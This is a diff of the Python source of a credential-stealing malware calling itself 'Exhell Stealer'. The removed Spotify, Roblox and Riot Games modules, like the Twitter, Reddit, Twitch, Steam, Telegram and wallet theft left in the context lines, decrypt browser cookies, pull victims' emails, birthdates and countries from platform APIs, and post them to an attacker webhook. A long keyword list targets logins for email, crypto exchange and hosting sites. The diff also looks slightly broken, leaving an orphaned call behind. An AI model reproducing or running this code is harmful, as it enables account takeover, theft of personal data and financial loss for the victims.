@@ -40,9 +40,6 @@ class Variables:
     TikTokAccounts = list()
     RedditAccounts = list()
     TwtichAccounts = list()
-    SpotifyAccounts = list()
-    RobloxAccounts = list()
-    RiotGameAccounts = list()
 
 class SubModules:
     # Calls the CryptUnprotectData function from crypt32.dll
@@ -340,10 +337,6 @@ class Main:
                             asyncio.create_task(self.TwitterSession(cookie[3], "Firefox"))
                         if "reddit" in str(cookie[0]).lower() and "reddit_session" in str(cookie[1]).lower():
                             asyncio.create_task(self.RedditSession(cookie[3], "Firefox"))
-                        if "spotify" in str(cookie[0]).lower() and "sp_dc" in str(cookie[1]).lower():
-                            asyncio.create_task(self.SpotifySession(cookie[3], "Firefox"))
-                        if "roblox" in str(cookie[0]).lower() and "ROBLOSECURITY" in str(cookie[1]):
-                            asyncio.create_task(self.RobloxSession(cookie[3], "Firefox"))
                         if "twitch" in str(cookie[0]).lower() and "auth-token" in str(cookie[1]).lower():
                             twitch_cookie = cookie[3]
                         if "twitch" in str(cookie[0]).lower() and str(cookie[1]).lower() == "login":
@@ -352,8 +345,6 @@ class Main:
                             asyncio.create_task(self.TwitchSession(twitch_cookie, twitch_username, "Firefox"))
                             twitch_username = None
                             twitch_cookie = None
-                        if "account.riotgames.com" in str(cookie[0]).lower() and "sid" in str(cookie[1]).lower():
-                            asyncio.create_task(self.RiotGamesSession(cookie[3], "Firefox"))
         except:
             pass
         else:
@@ -487,9 +478,6 @@ class Main:
                         asyncio.create_task(self.TwitterSession(dec_cookie, BrowserName))
                     if "reddit" in str(cookie[0]).lower() and "reddit_session" in str(cookie[1]).lower():
                         asyncio.create_task(self.RedditSession(dec_cookie, BrowserName))
-                    if "spotify" in str(cookie[0]).lower() and "sp_dc" in str(cookie[1]).lower():
-                        asyncio.create_task(self.SpotifySession(dec_cookie, BrowserName))
-                    if "roblox" in str(cookie[0]).lower() and "ROBLOSECURITY" in str(cookie[1]):
                         asyncio.create_task(self.RobloxSession(dec_cookie, BrowserName))
                     if "twitch" in str(cookie[0]).lower() and "auth-token" in str(cookie[1]).lower():
                         twitch_cookie = dec_cookie
@@ -499,8 +487,6 @@ class Main:
                         asyncio.create_task(self.TwitchSession(twitch_cookie, twitch_username, BrowserName))
                         twitch_username = None
                         twitch_cookie = None
-                    if "account.riotgames.com" in str(cookie[0]).lower() and "sid" in str(cookie[1]).lower():
-                        asyncio.create_task(self.RiotGamesSession(dec_cookie, BrowserName))
         except:
             pass
     async def GetWallets(self, copied_path:str) -> None:
@@ -715,47 +701,7 @@ class Main:
                         write_file.write("First, close your telegram\nopen this file path on your computer <%appdata%\\Telegram Desktop\\tdata>.\nDelete all the files here, then copy the stolen files to this folder")
         except:
             pass
-    async def RiotGamesSession(self, cookie, browser:str) -> None:
-        try:
-            connector = aiohttp.TCPConnector(ssl=True)  
-            async with aiohttp.ClientSession(connector=connector) as session:
-                async with session.get('https://account.riotgames.com/api/account/v1/user', headers={"Cookie": f"sid={cookie}"}) as req:
-                    response = await req.json()
-                embed_data = {
-                    "title": "***Exhell Stealer***",
-                    "description": f"***Exhell Riot Games Session was detected on the {browser} browser***",
-                    "url" : "https://t.me/ExhellStealer",
-                    "color": 0,
-                    "footer": {"text": "https://t.me/ExhellStealer | https://github.com/quicaxd/Exhell-V2.0/Exhell-V2.0"},
-                    "thumbnail": {"url": "https://i.hizliresim.com/qxnzimj.jpg"}}
-                username = str(response["username"])
-                email = str(response["email"])
-                region = str(response["region"])
-                locale = str(response["locale"])
-                country = str(response["country"])
-                mfa = str(response["mfa"]["verified"])
-                fields = [
-                    {"name": "Username", "value": "``" + username + "``", "inline": True},
-                    {"name": "Email", "value": "``" + email + "``", "inline": True},
-                    {"name": "Region", "value": "``" +  region + "``", "inline": True},
-                    {"name": "Locale", "value": "``" + locale + "``", "inline": True},
-                    {"name": "Country", "value":"``" + country  + "``", "inline": True},
-                    {"name": "MFA Enabled?", "value": "``" + mfa + "``", "inline": True},
-                    {"name": "Cookie", "value": "``" + cookie + "``", "inline": False},]
-                embed_data["fields"] = fields
-                payload = {
-                    "username": "Exhell Stealer",
-                    "embeds": [embed_data]
-                }
-                headers = {
-                    "Content-Type": "application/json"
-                }
-                async with session.post(webhook, json=payload, headers=headers) as response:
-                    pass
-        except:
-            pass
-        else:
-            Variables.RiotGameAccounts.append(f'Username : {username}\nEmail : {email}\nRegion : {region}\nLocale : {locale}\nCountry : {country}\nMFA Enabled : {mfa}\nCookie : {cookie}\n======================================================================\n')
+            
     async def InstaSession(self, cookie, browser:str) -> None:
         try:
             pp = "https://i.hizliresim.com/8po0puy.jfif"
@@ -1045,59 +991,8 @@ class Main:
             pass
         else:
             Variables.TwtichAccounts.append(f"Cookie : {auth_token}\nProfile URL : {acc_url}\nID : {id}\nUsername : {login}\nDisplay Name : {displayName}\nEmail : {email}\nHas Prime : {hasPrime}\nis Partner : {isPartner}\nLanguage : {lang}\nBits : {bits}\nFollowers : {followers}\n======================================================================\n")
-    async def SpotifySession(self, cookie, browser:str) -> None:
-        try:
-            url = 'https://www.spotify.com/api/account-settings/v1/profile'
-
-            headers = {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
-                'Cookie': (
-                    f'sp_dc={cookie}'
-                )
-            }
-
-            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
-                async with session.get(url, headers=headers) as response:
-                    data = await response.text()
-                    data = json.loads(data)["profile"]
-
-
-            email = data["email"]
-            gender = data["gender"]
-            birthdate = data["birthdate"]
-            country = data["country"]
-            username = data["username"]
-            embed_data = {
-                "title": "***Exhell Stealer***",
-                "description": f"***Exhell Spotify Session was detected on the {browser} browser***",
-                "url" : "https://t.me/ExhellStealer",
-                "color": 0,
-                "footer": {"text": "https://t.me/ExhellStealer | https://github.com/quicaxd/Exhell-V2.0"},
-                "thumbnail": {"url": "https://i.hizliresim.com/6t31tw2.jpg"}}
-            fields = [
-                {"name": "Email", "value": "``" + str(email) + "``", "inline": True},
-                {"name": "Username", "value": "``" + str(username) + "``", "inline": True},
-                {"name": "Gender", "value": "``" +  str(gender) + "``", "inline": True},
-                {"name": "birthdate", "value": "``" + str(birthdate) + "``", "inline": True},
-                {"name": "country", "value":"``" + str(country) + "``", "inline": True},
-                {"name": "Profile URL", "value": "``" + str(f'https://open.spotify.com/user/{username}') + "``", "inline": False},
-                {"name": "Spotify Cookie", "value": "``" + str(cookie) + "``", "inline": False},]
-            embed_data["fields"] = fields
-            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
-                payload = {
-                    "username": "Exhell Stealer",
-                    "embeds": [embed_data]
-                }
-                headers = {
-                    "Content-Type": "application/json"
-                }
-                async with session.post(webhook, json=payload, headers=headers) as response:
-                    pass
         except:
             pass
-        else:
-            Variables.SpotifyAccounts.append(f"Cookie : {cookie}\nProfile URL : https://open.spotify.com/user/{username}\nEmail : {email}\nUsername : {username}\nGender : {gender}\nBirthdate : {birthdate}\nCountry : {country}\n======================================================================\n")
-    async def RedditSession(self, cookie, browser:str) -> None:
         try:
             gmail = ""
             cookies = "reddit_session=" + cookie
@@ -1594,15 +1489,12 @@ class Main:
             bookmark_list = Variables.Bookmarks
             autofill_list = Variables.Autofills
             download_list = Variables.Downloads
-            riot_acc = Variables.RiotGameAccounts
             insta_acc = Variables.InstagramAccounts
             twitter_acc = Variables.TwitterAccounts
             tiktok_acc = Variables.TikTokAccounts
             reddit_acc = Variables.RedditAccounts
             twitch_acc = Variables.TwtichAccounts
-            spotify_acc = Variables.SpotifyAccounts
             steam_acc = Variables.SteamAccounts
-            roblox_acc = Variables.RobloxAccounts
 
             processList = Variables.Processes
             if processList:
@@ -1665,11 +1557,6 @@ class Main:
                     file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for downloads in download_list:
                         file.write(downloads)
-            if riot_acc:
-                with open(os.path.join(filePath, "Sessions", "riot_games.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
-                    for riotgames in riot_acc:
-                        file.write(riotgames)
             if insta_acc:
                 with open(os.path.join(filePath, "Sessions", "instagram_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
@@ -1695,16 +1582,6 @@ class Main:
                     file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
                     for twitch in twitch_acc:
                         file.write(twitch)
-            if spotify_acc:
-                with open(os.path.join(filePath, "Sessions", "spotify_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
-                    for spotify in spotify_acc:
-                        file.write(spotify)
-            if roblox_acc:
-                with open(os.path.join(filePath, "Sessions", "roblox_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
-                    file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
-                    for roblox in roblox_acc:
-                        file.write(roblox)
             if steam_acc:
                 with open(os.path.join(filePath, "Sessions", "steam_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExhellStealer----------------------\n"+ "=" * 70 + "\n")
@@ -1758,7 +1635,7 @@ class Main:
             cookie_keys = ""
             password_keys = ""
             autofill_keys = ""
-            keywords = ["gmail.com", "live.com", "zoho.com", "tutanota.com", "trashmail.com", "gmx.net", "safe-mail.net", "thunderbird.net", "mail.lycos.com",    "hushmail.com", "mail.aol.com", "icloud.com", "protonmail.com", "fastmail.com", "rackspace.com", "1and1.com", "mailbox.org", "mail.yandex.com", "titan.email", "youtube.com", "nulled.to", "cracked.to", "tiktok.com", "yahoo.com", "gmx.com", "aol.com", "coinbase", "mail.ru", "rambler.ru", "gamesense.pub", "neverlose.cc",    "onetap.com", "fatality.win", "vape.gg", "binance", "ogu.gg", "lolz.guru", "xss.is", "g2g.com", "igvault.com", "plati.ru", "minecraft.net", "primordial.dev",    "vacban.wtf", "instagram.com", "mail.ee", "hotmail.com", "facebook.com", "vk.ru", "x.synapse.to", "hu2.app", "shoppy.gg", "app.sell", "sellix.io", "gmx.de",    "riotgames.com", "mega.nz", "roblox.com", "exploit.in", "breached.to", "v3rmillion.net", "hackforums.net", "0x00sec.org", "unknowncheats.me", "godaddy.com","accounts.google.com", "aternos.org", "namecheap.com", "hostinger.com", "bluehost.com", "hostgator.com", "siteground.com", "netafraz.com", "iranserver.com","ionos.com", "whois.com", "te.eg", "vultr.com", "mizbanfa.net", "neti.ee", "osta.ee", "cafe24.com", "wpengine.com", "parspack.com", "cloudways.com", "inmotionhosting.com","hinet.net", "mihanwebhost.com", "mojang.com", "phoenixnap.com", "dreamhost.com", "rackspace.com", "name.com", "alibabacloud.com", "a2hosting.com", "contabo.com","xinnet.com", "7ho.st", "hetzner.com", "domain.com", "west.cn", "iranhost.com", "yisu.com", "ovhcloud.com", "000webhost.com", "reg.ru", "lws.fr", "home.pl",    "sakura.ne.jp", "matbao.net", "scalacube.com", "telia.ee", "estoxy.com", "zone.ee", "veebimajutus.ee", "beehosting.pro", "core.eu", "wavecom.ee", "iphoster.net",    "cspacehostings.com", "zap-hosting.com", "iceline.com", "zaphosting.com", "cubes.com", "chimpanzeehost.com", "fatalityservers.com", "craftandsurvive.com", "mcprohosting.com",    "shockbyte.com", "ggservers.com", "scalacube.com", "apexminecrafthosting.com", "nodecraft.com", "sparkedhost.com", "pebblehost.com", "ramshard.com", "linkvertise.com",    "adf.ly", "spotify.com", "tv3play.ee", "clarity.tk", "messenger.com", "snapchat.com", "boltfood.eu", "stuudium.com", "ekool.eu", "steamcommunity.com", "epicgames.com",    "0x00sec.org", "greysec.net", "twitter.com", "reddit.com", "amazon.com", "redengine.eu", "eulencheats.com", "4netplayers.com", "velia.net", "bybit.com", "coinbase.com",    "ftx.com", "ftx.us", "binance.us", "bitfinex.com", "kraken.com", "bitstamp.net", "bittrex.com", "kucoin.com", "cex.io", "gemini.com", "blockfi.com", "nexo.io",    "nordvpn.com", "surfshark.com", "privateinternetaccess.com", "netflix.com", "play.tv3.ee", ".ope.ee", "astolfo.lgbt", "intent.store", "novoline.wtf", "flux.today",    "moonx.gg", "novoline.lol", "twitch.tv"]
+            keywords = ["gmail.com", "live.com", "zoho.com", "tutanota.com", "trashmail.com", "gmx.net", "safe-mail.net", "thunderbird.net", "mail.lycos.com",    "hushmail.com", "mail.aol.com", "icloud.com", "protonmail.com", "fastmail.com", "rackspace.com", "1and1.com", "mailbox.org", "mail.yandex.com", "titan.email", "youtube.com", "nulled.to", "cracked.to", "tiktok.com", "yahoo.com", "gmx.com", "aol.com", "coinbase", "mail.ru", "rambler.ru", "gamesense.pub", "neverlose.cc",    "onetap.com", "fatality.win", "vape.gg", "binance", "ogu.gg", "lolz.guru", "xss.is", "g2g.com", "igvault.com", "plati.ru", "minecraft.net", "primordial.dev",    "vacban.wtf", "instagram.com", "mail.ee", "hotmail.com", "facebook.com", "vk.ru", "x.synapse.to", "hu2.app", "shoppy.gg", "app.sell", "sellix.io", "gmx.de", "mega.nz", "roblox.com", "exploit.in", "breached.to", "v3rmillion.net", "hackforums.net", "0x00sec.org", "unknowncheats.me", "godaddy.com","accounts.google.com", "aternos.org", "namecheap.com", "hostinger.com", "bluehost.com", "hostgator.com", "siteground.com", "netafraz.com", "iranserver.com","ionos.com", "whois.com", "te.eg", "vultr.com", "mizbanfa.net", "neti.ee", "osta.ee", "cafe24.com", "wpengine.com", "parspack.com", "cloudways.com", "inmotionhosting.com","hinet.net", "mihanwebhost.com", "mojang.com", "phoenixnap.com", "dreamhost.com", "rackspace.com", "name.com", "alibabacloud.com", "a2hosting.com", "contabo.com","xinnet.com", "7ho.st", "hetzner.com", "domain.com", "west.cn", "iranhost.com", "yisu.com", "ovhcloud.com", "000webhost.com", "reg.ru", "lws.fr", "home.pl",    "sakura.ne.jp", "matbao.net", "scalacube.com", "telia.ee", "estoxy.com", "zone.ee", "veebimajutus.ee", "beehosting.pro", "core.eu", "wavecom.ee", "iphoster.net",    "cspacehostings.com", "zap-hosting.com", "iceline.com", "zaphosting.com", "cubes.com", "chimpanzeehost.com", "fatalityservers.com", "craftandsurvive.com", "mcprohosting.com",    "shockbyte.com", "ggservers.com", "scalacube.com", "apexminecrafthosting.com", "nodecraft.com", "sparkedhost.com", "pebblehost.com", "ramshard.com", "linkvertise.com",    "adf.ly", "spotify.com", "tv3play.ee", "clarity.tk", "messenger.com", "snapchat.com", "boltfood.eu", "stuudium.com", "ekool.eu", "steamcommunity.com", "epicgames.com",    "0x00sec.org", "greysec.net", "twitter.com", "reddit.com", "amazon.com", "redengine.eu", "eulencheats.com", "4netplayers.com", "velia.net", "bybit.com", "coinbase.com",    "ftx.com", "ftx.us", "binance.us", "bitfinex.com", "kraken.com", "bitstamp.net", "bittrex.com", "kucoin.com", "cex.io", "gemini.com", "blockfi.com", "nexo.io",    "nordvpn.com", "surfshark.com", "privateinternetaccess.com", "netflix.com", "play.tv3.ee", ".ope.ee", "astolfo.lgbt", "intent.store", "novoline.wtf", "flux.today",    "moonx.gg", "novoline.lol", "twitch.tv"]
             for c in keywords:
                 found_autofill = False 
                 found_passw = False  
@@ -1850,9 +1727,6 @@ class Main:
              {"name": "TikTok", "value": "``" + str(len(Variables.TikTokAccounts)) + "``", "inline": True},
              {"name": "Twitch", "value": "``" + str(len(Variables.TwtichAccounts)) + "``", "inline": True},
              {"name": "Reddit", "value": "``" + str(len(Variables.RedditAccounts)) + "``", "inline": True},
-             {"name": "Spotify", "value": "``" + str(len(Variables.SpotifyAccounts)) + "``", "inline": True},
-             {"name": "Riot Game's", "value": "``" + str(len(Variables.RiotGameAccounts)) + "``", "inline": True},
-             {"name": "Roblox", "value": "``" + str(len(Variables.RobloxAccounts)) + "``", "inline": True},
              {"name": "Steam", "value": "``" + str(len(Variables.SteamAccounts)) + "``", "inline": True},
              {"name": "Wifi", "value": "``" + str(len(Variables.Wifis)) + "``", "inline": True},
              {"name": "FireFox?", "value": "``" + str(self.FireFox) + "``", "inline": True},]
